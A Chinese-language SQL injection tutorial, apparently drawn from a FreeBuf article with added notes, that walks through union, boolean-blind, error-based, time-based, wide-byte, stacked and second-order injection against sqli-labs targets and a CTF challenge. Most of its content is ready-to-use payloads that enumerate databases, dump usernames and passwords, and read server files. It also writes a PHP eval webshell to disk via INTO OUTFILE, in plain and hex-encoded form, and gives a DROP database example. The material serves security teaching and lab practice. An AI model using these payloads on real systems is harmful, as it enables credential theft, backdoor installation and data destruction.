[从0到1，SQL注入（sql十大注入类型）收藏这一篇就够了，技术解析与实战演练 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/404072.html)
# union注入的步骤
1.找到注入点

2.找到数据库

`a' union select 1,database(),3 #`

3.找到表
```
a' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='数据库名'),3 #


-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='web1'),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'


有的环境下，`information_schema` 可能被限制访问。可以使用
from mysql.innodb_table_stats where database_name=""

1'/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name="web1"'


```


```
-1/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema="web7"),3
```

4.找表里的栏目名字
```
a' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='栏目名' and table_name='表名'),3 #

无information_schema



```
下面为主
```
1' union select 1,2,(group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1')
```
5.查询内容
a' union select 1,(select 栏名 from 表),3 #
也可以 
```
1' union select 1,database(),group_concat(id,username,password) from 表名#
也可以使用派生表


-1'/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4'

派生表中有1列 2(a)列3  (b)列然后把users表中所有内容粘到这里进行查询

这里的a)是表的名字叫a的意思

```


# sql注入
## 什么是 Sql 注入？

SQL 注入是比较常见的网络攻击方式之一，它不是利用操作系统的 BUG 来实现攻击，而是针对程序员编写时的疏忽，通过 SQL 语句，实现无账号登录，甚至篡改数据库。

由于以下的环境都是 MySQL 数据库，所以先了解点 MySQL 有关的知识。在 MySQL5.0 之后，MySQL 中默认添加了一个名为`information_schema`的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。

mysql中注释符：#   、/**/ 、  --

#### information_schema 中三个很重要的表：

- information_schema.**schemata**: 该数据表存储了 mysql 数据库中的所有数据库的`库名`
    
- information_schema.**tables**： 该数据表存储了 mysql 数据库中的所有数据表的`表名`
    
- information_schema.**columns**: 该数据表存储了 mysql 数据库中的所有列的`列名`
    

# Mysql 中常用的函数

-------------------------------------  
version():查询数据库的版本  
user():查询数据库的使用者  
database():数据库  
system_user():系统用户名  
session_user():连接数据库的用户名  
current_user():当前用户名  
load_file():读取本地文件  
@@datadir:读取数据库路径  
 @@basedir:mysql安装路径  @version_complie_os:查看操作系统  
-------------------------------------

---

ascii(str):返回给定字符的ascii值。如果str是空字符串，返回0如果str是NULL，返回NULL。如 ascii("a")=97  
length(str) : 返回给定字符串的长度，如 length("string")=6  
substr(string,start,length):对于给定字符串string，从start位开始截取，截取length长度 ,如 substr("chinese",3,2)="in"  
substr()、stbstring()、mid() :三个函数的用法、功能均一致  
concat(username)：将查询到的username连在一起，默认用逗号分隔  
concat(str1,'*',str2)：将字符串str1和str2的数据查询到一起，中间用*连接  
group_concat(username) ：将username所有数据查询在一起，用逗号连接  
limit 0,1：查询第1个数 limit 1,1：查询第2个数

# 判断 SQL 注入是否存在

- 先加单引号`'`、双引号`"`、单括号`)`、双括号`))`等看看是否**报错**，如果报错就可能存在 SQL 注入漏洞了。
    
- 还有在 URL 后面加`and 1 = 1 、 and 1 = 2`看页面是否显示一样，**显示不一样**的话，肯定存在 SQL 注入漏洞了。
    
- 还有就是`Timing Attack`测试，也就是`时间盲注`。有时候通过简单的条件语句比如 and 1=2 是无法看出异常的。
    
- 在 MySQL 中，有一个`Benchmark()`函数，它是用于测试性能的。`Benchmark(count,expr)`，这个函数执行的结果，是将表达式`expr`执行`count`次 。
    

因此，利用`benchmark函数`，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为`Timing Attack`，也就是`时间盲注`。

**易出现 SQL 注入的功能点：**凡是和`数据库有交互`的地方都容易出现 SQL 注入，SQL 注入经常出现在登陆页面、涉及获取 HTTP 头（user-agent / client-ip 等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在 HTTP 头中的 client-ip 和 x-forward-for 等字段处。这些字段是用来记录登陆的 ip 的，有可能会被存储进数据库中从而与数据库发生交互导致 sql 注入。

# Sql 注入的分类

  

---

|分类依据|类型|
|---|---|
|获取信息的方式|布尔盲注，时间盲注，报错注入 ，union查询注入，堆叠注入等|
|提交方式|GET、POST、COOKIE、HTTP 注入等|
|注入点类型|数字类型的注入、字符串类型的注入、搜索型注入等|
|其他注入|二次注入、User-Agent 注入、文件读写、宽字节注入 、万能密码 等|

  

---

# N 大类型 Sql 注入原理

## 一、布尔盲注

### 1. 原理以及手工注入

  

---

条件：`攻击者无法直接获取到这些信息`Web 的页面的仅仅会返回`True`和`False`。那么布尔盲注就是进行 SQL 注入之后然后根据页面返回的 True 或者是 False 来得到数据库中的相关信息。这里介绍的是通过 ascii 码进行盲注的案例。

盲注一般用到的一些函数：`ascii()`、`substr()`、`length()`，`exists()`、`concat()`等

`http://192.168.1.132:86/Less-5/?id=1`为正确页面，回显如下图：

![1715886484523-749fb595-05a0-467a-bc4c-e5e108347edf.png](https://image.3001.net/images/20240705/1720189244_6688013c06926e02eb02c.png!small)

`http://192.168.209.128:88/Less-5/?id=1'`为**错误页面**，发现注入点，回显如下图：![1715886479105-8f8d470e-bf02-4c3a-8753-bdeafa3f792d.png](https://image.3001.net/images/20240705/1720189246_6688013e049cfafaeb9ee.png!small)

`http://192.168.209.128:88/Less-5/?id=1' and length(database())>5 -- qwe`注：这里 qwe 前需要使用**空格**使用 bool 值进行注入比如：and 1=1

![1715886450133-0b096b91-d898-43e4-9d60-9ab5342256da.png](https://image.3001.net/images/20240705/1720189247_6688013f877c347d76225.png!small)

#### 1.如何判断数据库类型？

  

---

这个例子中出错页面已经告诉了我们此数据库是 MySQL，那么当我们不知道是啥数据库的时候，如何分辨是哪个数据库呢？目前主流的数据库都有自己的特有表分别如下：

|数据库|表名|
|---|---|
|MySQL|information_schema.tables|
|Access|msysobjects|
|SQLServer|sysobjects|

通过这些特有表，我们就可以用如下的语句判断数据库。哪个页面正常显示，就属于哪个数据库

//判断是否是Mysql数据库  
http://192.168.209.128:88/Less-5/?id=1' and exists(select * from information_schema.tables)  #  
​  
//判断是否是 access数据库  
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from msysobjects) #  
​  
//判断是否是 Sqlserver数据库  
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from sysobjects) #'  
​  
//对于MySQL数据库，information_schema 数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。

`information_schema.tables`存储了数据表的元数据信息，下面对常用的字段进行介绍：

|名称|描述|
|---|---|
|table_schema|记录数据库名|
|table_name|记录数据表名|
|table_rows|关于表的粗略行估计|
|data_length|记录表的大小（单位字节）|

#### 2. 判断当前数据库名(以下方法不适用于 access 和 SQL Server 数据库)

  

---

1：判断当前数据库的长度，利用二分法  
http://192.168.209.128:88/sqli/Less-5/?id=1' and length(database())>5 --+ //正常显示  
http://192.168.209.128:88/sqli/Less-5/?id=1' and length(database())>10 --+ //不显示任何数据  
http://192.168.209.128:88/sqli/Less-5/?id=1' and length(database())>7 --+ //正常显示  
http://192.168.209.128:88/sqli/Less-5/?id=1' and length(database())>8 --+ //不显示任何数据

大于 7 正常显示，大于 8 不显示，说明大于 7 而不大于 8，所以可知当前数据库长度为 8 img img

2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断  
​  
//判断数据库的第一个字符  
​  
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),1,1))>100 --+  
​  
//判断数据库的第二个字符  
​  
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),2,1))>100 --+  
...........

由此可以判断出当前数据库为 security，注意使用`ascii码`转换字符的时候需要使用`十进制`

#### 3. 判断当前数据库中的表（语句后面添加--+）

  

---

[http://127.0.0.1/sqli/Less-5/?id=1](http://127.0.0.1/sqli/Less-5/?id=1)' and exists(select*from admin) //猜测当前数据库中是否存在 admin 表

1：判断当前数据库中表的个数  
// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4  
http://127.0.0.1/sqli/Less-5/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>5 #  
​  
2：判断每个表的长度  
//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6  
http://127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6  
//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6  
http://127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6  
​  
3：判断每个表的每个字符的ascii值  
//判断第一个表的第一个字符的ascii值  
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 #  
//判断第一个表的第二个字符的ascii值  
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>100 #  
.........

由此可判断出存在表 emails、referers、uagents、users ，猜测 users 表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断

#### 4. 判断表中的字段

  

---

[http://127.0.0.1/sqli/Less-5/?id=1](http://127.0.0.1/sqli/Less-5/?id=1)' and exists(select username from admin) //如果已经证实了存在 admin 表，那么猜测是否存在 username 字段

1：判断表中字段的个数  
​  
//判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的  
http://127.0.0.1/sqli/Less-5/?id=1' and (select count(column_name) from information_schema.columns where table_name='users')>5 #  
​  
2：判断字段的长度  
​  
//判断第一个字段的长度  
http://127.0.0.1/sqli/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>5  
​  
//判断第二个字段的长度  
http://127.0.0.1/sqli/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 1,1))>5  
​  
3：判断字段的ascii值  
​  
//判断第一个字段的第一个字符的长度  
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>100  
​  
//判断第一个字段的第二个字符的长度  
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),2,1))>100  
​  
...........

由此可判断出 users 表中存在 id、username、password 字段

#### 5.判断字段中的数据

  

---

我们知道了 users 中有三个字段 id 、username 、password，我们现在爆出每个字段的数据

1: 判断数据的长度  
  
// 判断id字段的第一个数据的长度  
http://127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 0,1))>5  
  
// 判断id字段的第二个数据的长度  
http://127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 1,1))>5  
  
2：判断数据的ascii值  
  
// 判断id字段的第一个数据的第一个字符的ascii值  
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit 0,1),1,1))>100  
  
// 判断id字段的第一个数据的第二个字符的ascii值  
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit 0,1),2,1))>100  
  
...........

## 二、union查询注入（union 注入）
![[Pasted image 20251113141245.png]]

### 一、原理及手工注入

  

---

三个条件：

1. 两个表的`列数相同`，并且相应的列具有`相似的数据类型`。
    
2. 查询结果`回显`。
    
3. 存在注入漏洞。
    

我们可以通过`order by`来判断当前表的列数。

http://192.168.209.128:88/Less-1/?id=1'  order by 4-- qwq

4 时错误，3 时正确，可得知，当前表有 3 列![1715934160666-cedf7853-0426-41f8-8b9a-21abc38e80b2.png](https://image.3001.net/images/20240705/1720189248_66880140b3112a2d2e2ab.png!small)

![1715934165497-9c76c5c0-b258-4251-af83-c28c4d4d8ae7.png](https://image.3001.net/images/20240705/1720189249_66880141e9cb4664dc3ac.png!small)

通过`union union查询`来知道显示的列数。

http://192.168.209.128:88/Less-1/?id=-1' union select 1 ,2 ,3 -- qwq

![1715934253111-bda7de60-9f11-4e30-859e-8434529c724e.png](https://image.3001.net/images/20240705/1720189251_668801436c25d97f3cdbe.png!small)

我们union查询的就显示出来了。可知，第 2 列和第 3 列是`回显列`。那我们就可以在这两个位置插入一些函数了。

-------------------------------------  
version():查询数据库的版本  
user():查询数据库的使用者  
database():数据库  
system_user():系统用户名  
session_user():连接数据库的用户名  
current_user:当前用户名  
load_file:读取本地文件  
@@datadir:读取数据库路径  
@@basedir:mysql安装路径  
@@version_complie_os:查看操作系统  
-------------------------------------

开始注入脚本

//回显出数据库版本信息、数据库所在路径  
http://192.168.209.128:88/Less-1/?id=-1' union select 1,version(),@@datadir -- qwq  
//更多自行尝试  
。。。。。。

![1715934342272-76331a33-be1f-483e-a4d3-a075ad7259ef.png](https://image.3001.net/images/20240705/1720189252_668801443e9e909f3a3c2.png!small)

我们还可以通过 union 注入获得更多的信息。

// 获得所有的数据库  
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+  
  
// 获得所有的表  
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables--+  
  
// 获得所有的列  
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns --+

通过`select 1,database(),3...`，得出当前数据库名`security`，我们就可以通过下面的语句得到当前数据库的所有的表。

http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- +

![1715934561648-d313b1eb-d0bf-4171-9195-a53dfa2b16ff.png](https://image.3001.net/images/20240705/1720189253_6688014525ef3e1debcdc.png!small)

我们知道了当前数据库中存在了四个表，那么我们可以通过下面的语句知道`每个表中的列`。

http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' -- +

如下，我们可以知道 users 表中有 id，username，password 三列![1715934665023-ecdc71d7-2c68-4fd7-a18d-9ab5e6b8f3a0.png](https://image.3001.net/images/20240705/1720189254_668801462cefb00918246.png!small)

使用 group_concat()拼接账号密码还有 id，即可爆出所有数据

http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,group_concat(id,'--',username,'--',password),3 from users -- +

![1715934852143-dd5fa22b-365e-44f4-ac1b-d33c3739470a.png](https://image.3001.net/images/20240705/1720189255_668801471eadcd1e95ec5.png!small)

## 三、文件读写

### 1. union 注入读取文件

  

---

**注**：当有显示列的时候，文件读可以利用 union 注入。当没有显示列的时候，只能利用盲注进行数据读取；

文件写入只能利用 union 注入

示例：读取系统根目录下的/demo.txt 文件

//union注入读取 /demo.txt 文件,windows使用->盘符:/路径  
​  
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,load_file("demo.txt") -- +  
​  
//也可以把 /demo.txt 转换成16进制 这里没成功，可以去找找资料。。。  
​  
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,load_file(0x2F64656D6F2E747874) -- +

如果不成功，参考以下解决方案 在 mysql 目录中找到 my.ini/my.cnf 文件在[mysqld]下面添加如下内容`secure_file_priv = ""`如图：

![1716022395936-80ba678d-e8dc-4af8-bb87-c7945280e9e5.png](https://image.3001.net/images/20240705/1720189256_668801483064b3d1721e5.png!small)

登录 mysql 执行以下命令

mysql>SHOW VARIABLES LIKE "secure_file_priv";  
  
+------------------+-------+  
| Variable_name    | Value |  
+------------------+-------+  
| secure_file_priv |       |  
+------------------+-------+

这里`secure_file_priv`的值要为""或者 "/" secure_file_priv 有三个值

1、限制 mysqld 不允许导入 | 导出

`mysqld –secure_file_prive=null`

2、限制 mysqld 的导入 | 导出 只能发生在/tmp/目录下

`mysqld –secure_file_priv=/tmp/`

3、不对 mysqld 的导入 | 导出做限制

`secure_file_priv=''`

### 2. 盲注读取文件

  

---

盲注读取的话就是利用`hex函数`，将读取的字符串转换成 16 进制，再利用`ascii函数`，转换成 ascii 码，再利用`二分法`一个一个的判断字符，很复杂，一般结合工具完成

http://127.0.0.1/sqli/Less-1/?id=-1' and ascii(mid((select hex(load_file('e:/3.txt'))),18,1))>49#' LIMIT 0,1

我们可以利用写入文件的功能，在 e 盘创建 4.php 文件，然后写入一句话木马。

//利用union注入写入一句话木马 into outfile 和 into dumpfile 都可以  
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,'<?php @eval($_POST[aaa]);?>' into outfile 'd:/4.php' -- +  
​  
// 可以将一句话木马转换成16进制的形式  
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e into outfile 'd:/4.php' -- +

在文件写入读取的时候，遇见以下这种情况。

![1716022452405-8d8a1217-e02d-4bcc-9b45-4cd92cd5749b.png](https://image.3001.net/images/20240705/1720189257_6688014921ab21193090b.png!small)

多半是因为`权限不足`，可以使用`@@datadir`，得到当前数据库存储目录，试着在数据库存储目录进行文件注入 比如

http://192.168.209.128:88/Less-1/?id=-1' union select 1,2,'<?php @eval($_POST[aaa]);?>' into outfile '/www/server/mysql/4.php' --

![1716022468251-745804a3-a06e-4319-a2c6-f7951aeda467.png](https://image.3001.net/images/20240705/1720189258_6688014a02f376b0ba5bd.png!small)

注入成功

**权限不足的解决办法-参考**环境： CentOS7.0 64 位 MySQL5.7 问题：

#使用'select into outfile'备份数据表提示无法写入文件  
mysql> select 1,2,'you are very good hacker' from  into outfile '/www/server/mysql/app.txt';  
ERROR 1 (HY000): Can't create/write to file '/www/server/mysql/app.txt' (Errcode: 13)

排查：

#查看mysql的进程用户,为mysql用户  
[root@lfs ~]# ps aux|grep mysqld  
root       1400  0.0  0.1 108208  1612 ?        S    01:22   0:00 /bin/sh /usr/local/mysql/bin/mysqld_safe --user=mysql  
mysql      1778  0.0  6.6 974276 67076 ?        Sl   01:22   0:06 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/lfs.err --pid-file=/usr/local/mysql/data/lfs.pid --socket=/tmp/mysql.sock --port=3306  
​  
#查看/www/server/mysql/目录的权限，mysql用户没有写入权限  
[root@lfs ~]# ls -ld /www/server/mysql/  
drwxr-xr-x 4 root root 4096 Aug 23 17:03 /www/server/mysql/

解决办法：

#将/data/mysql/目录的归属为mysql用户  
chown -R mysql.mysql /www/server/mysql/  
  
[root@lfs ~]# ls -ld /data/mysql/  
drwxr-xr-x 4 mysql mysql 4096 Aug 23 17:03 /www/server/mysql/

验证，写入成功：![1716022468251-745804a3-a06e-4319-a2c6-f7951aeda467.png](https://image.3001.net/images/20240705/1720189258_6688014a02f376b0ba5bd.png!small)

## 四、报错注入

### 报错注⼊常⽤的函数

  

---

1. floor()
    
2. extractvalue()
    
3. updatexml()
    
4. geometrycollection()
    
5. multipoint()
    
6. polygon()
    
7. multipolygon()
    
8. linestring()
    
9. .。。。。。
    

这里介绍一个案例`updatexml()`。

### updatexml()

MySQL提供了一个`updatexml()`函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。

我们尝试在查询用户id的同时，使用报错函数，在地址栏输入：`?id=1' and updatexml(1, 0x7e, 3) -- a`

参数2内容中的查询结果显示在数据库的报错信息中，并回显到页面。

![1716043673909-4010fb3a-8a1c-49e0-aae7-27b2eb2e8131.png](https://image.3001.net/images/20240705/1720189259_6688014bcb44aaa4082c2.png!small)

  

`version()`：返回数据库版本`concat()`：拼接特殊符号和查询结果

`updatexml()`函数的报错内容长度不能超过32个字符，常用的解决方式有两种：

1. `limit`：分页
    
2. `substr()`：截取字符
    

#### 1.1 limit分页

  

---

例如，已知users表中包含username和password两个字段，显示出某个password字段的数据

id=-1' and updatexml(1, concat(0x7e,(  
select password from users limit 0,1  
)), 3) -- a

![1716043673909-4010fb3a-8a1c-49e0-aae7-27b2eb2e8131.png](https://image.3001.net/images/20240705/1720189259_6688014bcb44aaa4082c2.png!small)

使用`group_concat(字段名)`显示出最高32位字符长度，password字段的数据

id=-1' and updatexml(1, concat(0x7e,(  
select group_concat(password) from users limit 0,1  
)), 3) -- a

![1716043692705-9a0d4374-af18-4a74-b26c-d62bdd81b590.png](https://image.3001.net/images/20240705/1720189261_6688014d4e6c306ef3e85.png!small)

![[Pasted image 20251014115857.png]]



#### 1.2 substr()

  

---

获取密码数据案例

http://192.168.209.128:88/Less-1/?id=-1' and updatexml(1, concat(0x7e,  
substr((select group_concat(password) from users),1,31)  
),3) -- qwe

![1716043714374-9da190b6-678c-4cb9-8599-2a0564aae83f.png](https://image.3001.net/images/20240705/1720189262_6688014e09f1c4d0db689.png!small)
![[Pasted image 20251014120000.png]]

#### 1.3 步骤总结

  

---

适用情况：页面有数据库报错信息

1.网站信息必须是动态的，来自数据库的报错信息。  
2.网站写死的、自定义的报错信息不算

1>.判断是否报错

参数中添加单/双引号，页面报错才可进行下一步。

?id=1' -- a

2>.判断报错条件

参数中添加报错函数，检查报错信息是否正常回显。

?id=1' and updatexml(1,'~',3) -- a 

3>. 脱库

//获取所有数据库  
?id=1' and updatexml(1,concat('~',  
substr(  
(select group_concat(schema_name) from 				information_schema.schemata)  
,1,31)  
),3) -- qwq   
  
//获取所有表  
?id=1' and updatexml(1,concat('~',  
substr(  
(select group_concat(table_name) from information_schema.tables where table_schema ='security')  
,1,31)  
),3) -- qwq  
  
//获取所有字段  
?id=1' and updatexml(1,concat('~',  
substr(  
(select group_concat(column_name) from information_schema.columns where table_schema ='security' and table_name='users')  
,1,31)  
),3) -- qwq


###  例题
**首先使用updatexml()函数进行SQL报错注入** 
爆库
`1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#`
![[Pasted image 20251014120935.png]]
得到库名geek

查表 
`1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#`![[Pasted image 20251014122433.png]]
得到数据表H4rDsq1
爆字段 
`1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#`

![](https://developer.qcloudimg.com/http-save/yehe-8909609/6cd1fbc11b22bb18ed67ceff046cdba6.png)

> 得到三个字段：id、username、password

查字段内容
`1'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))#`

![](https://developer.qcloudimg.com/http-save/yehe-8909609/01ada93f3f2c3da3d2c031d1e0a08588.png)

> 得到前一半flag值flag{389c9161-c2eb-403a-80

使用right()突破字符限制 `1'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#`

![](https://developer.qcloudimg.com/http-save/yehe-8909609/53076ead862013bc2a78c3c4bc02af0a.png)

> 得到后一段flag值b-403a-8062-80f219ca1c30}

**拼接得到最终flag：** `flag{389c9161-c2eb-403a-8062-80f219ca1c30}`
## 五、时间盲注

  

---

`Timing Attack注入，也就是时间盲注`。通过简单的条件语句比如 and 1=2 是无法看出异常的。

在MySQL中，有一个`Benchmark()`函数，它是用于测试性能的。Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。

因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为`Timing Attack`，也就是时间盲注。

利用前提：页面上没有显示位，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返回页面都一样，但是加入 sleep(5)条件之后，页面的返回速度明显慢了 5 秒。

//判断是否存在延时注入  
?id=1' and sleep(5) --+

## 六、宽字节注入

  

---

宽字节注入是由于不同编码中中英文`所占字符`的的不同所导致的，通常的来说，在GBK编码当中，一个汉字占用2个字节。除了UTF-8以外，所有的ANSI编码中文都是占用俩个字符。

//GBK和其他所有ANSI结果为2  
echo strlen("中")   
  
//UTF-8  
echo strlen("中") //结果为3

我们先说一下php中对于sql注入的过滤，这里就不得不提到几个函数了。

`addslashes()`函数，这个函数在`预定义字符`之前添加反斜杠 \ 。 这个函数有一个特点虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。。这个函数的功能和`魔术引号`完全相同，所以当打开了魔术引号时，不应使用这个函数。可以使用`get_magic_quotes_gpc()`来检测是否已经转义。

`mysql_real_escape_string()`函数，这个函数用来转义sql语句中的特殊符号`x00`、`\n`、`\r`、`\`、`'`、`"`、`x1a`。

**注：**

1. `预定义字符`：单引 '，双引 "，反斜 \，NULL
    
2. `魔术引号`：当打开时，所有单引号 '、双引号 " 、反斜杠 \ 和NULL字符都会被自动加上一个反斜线来进行转义，和addslashes()函数的作用完全相同。所以，如果魔术引号打开，就不要使用addslashes()函数。一共有三个魔术引号指令：
    
    1. magic_quotes_gpc
        
    2. magic_quotes_runtime
        
    3. magic_quotes_sybase
        

实操：此次采用sqli的Less-32，

//正常显示  
http://192.168.209.128:88/Less-32/?id=1 -- qwq

开始注入：

//添加引号  
http://192.168.209.128:88/Less-32/?id=1' -- qwq

![1716376627491-71206ef1-ad05-4374-b9c1-61a269090a41.png](https://image.3001.net/images/20240705/1720189263_6688014f0cf5c67319e25.png!small)

//布尔注入  
http://192.168.209.128:88/Less-32/?id=1' and 1=2 -- qwq

![1716376632513-825eee52-8dd7-4d19-96b8-335bff919b1e.png](https://image.3001.net/images/20240705/1720189264_668801509b1ec44da65e8.png!small)

//unionunion注入  
http://192.168.209.128:88/Less-32/?id=1' union select 1,version(),database() -- qwq

![1716376639740-bab683c2-18e8-4145-b589-70f01905245c.png](https://image.3001.net/images/20240705/1720189266_668801524b65009b77387.png!small)

发现页面回显信息，每次注入都将\进行了转义，这时候就要把`\`去掉，

宽字节注入，这里利用的是MySQL的一个特性。MySQL在使用GBK编码的时候，会认为`2`个字符是`1`个汉字，前提是前一个字符的ASCII值大于128，才会认为是汉字。所以只要我们输入的数据`大于等于 %81`就可以使 ' 逃脱出来了。

开始注入：

http://192.168.1.132:86/Less-32/?id=1 %df 

![1716381273534-df8b7050-e9f5-4864-b5b8-0319682458a0.png](https://image.3001.net/images/20240705/1720189268_668801540beece4edf16d.png!small)

可以发现%df和 ' 组成了一个汉字 把`/`号干掉之后就可以用unionunion注入查询数据了。

http://192.168.209.128:88/Less-32/?id=-1�' union select 1,2,3 -- qwq

![1716381470201-7fde3241-aab6-40fe-8b12-c96c0b41aa16.png](https://image.3001.net/images/20240705/1720189269_66880155bb37be00a7e4c.png!small)

注入成功！

## 七、堆叠注入

  

---

在SQL中，分号;是用来表示一条sql语句的结束。试想一下我们在 一条语句结束后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了`堆叠注入`。而union injection（union注入）也是将两条语句合并在一起，两者之间有什么区别呢？区别就在于union 或者union all执行的语句类型是有限的，只可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：root';DROP database user；服务器端生成的sql语句为：`select * from user where name='root';DROP database user；`当执行查询后，第一条显示查询信息，第二条则将整个user数据库删除。

## 八、二次注入

### 概念

  

---

二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。二次注入是sql注入的一种，但是比普通`sql注入`利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。

### 原理

  

---

在第一次进行数据插入数据库得时候，仅仅知识使用了`addslashes()`或者是借助`get_magic_quotes_gpc()`对其中得字符进行了转义，在后端代码中可能会被转义，但在存入数据库时候还是原来得数据，数据中一般带有单引号和#号，然后下次使用在拼凑SQL中，所以就行了二次注入。

### 过程

  

---

1. 插入1‘#
    
2. 转义成1\’#
    
3. 不能注入，但是保存在数据库时变成了原来的1’#
    
4. 利用1’#进行注入,这里利用时要求取出数据时不转义
    

### 条件

  

---

1. 用户向数据库插入恶意语句（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）
    
2. 数据库对自己存储得数据非常放心，直接读取出恶意数据给用户
    

### 利用

  

---

1. 注册用户名admin’-- -(后面的-是为了突出前面的空格，起到了注释作用)
    

![1716458168571-bf785ca3-4c89-4b8d-af5d-b12b44053d1b.png](https://image.3001.net/images/20240705/1720189271_66880157577b900aa5631.png!small)

2. 使用刚刚注册得账号进行登录。
    

![1716458210300-98a116e4-3b0f-4de9-ad26-72f841624c83.png](https://image.3001.net/images/20240705/1720189273_66880159b913119cfb855.png!small)

3、查看注册源代码

![1716458286969-e9e7d628-1331-45e3-8ae3-681df4b0864c.png](https://image.3001.net/images/20240705/1720189275_6688015bb83a09538cd7c.png!small)发现用户在注册的时候没有进行特殊符号过滤，所以再一次说明我们注册的用户成功！

4. 进行修改密码（攻击）
    

![1716458515741-9c7eac67-ed6b-425d-9860-682c4fa93d40.png](https://image.3001.net/images/20240705/1720189276_6688015cae8e0afbdfadb.png!small)

5. 攻击成功 ，返回使用更新后的密码登录账号 admin。
    

![1716458542259-c5ca820d-eebd-4025-afa1-543eae63c67d.png](https://image.3001.net/images/20240705/1720189278_6688015e538a978840044.png!small)

6. 登录成功![1716458585725-349cbee7-a00b-4b63-9e80-ad48a3c589f0.png](https://image.3001.net/images/20240705/1720189279_6688015f2d267ad45aaf1.png!small)
    

修改密码的时候，语句就会变为：

$sql = "UPDATE users SET PASSWORD='aaaaaa' where username='admin' -- w' and password='$curr_pass' ";

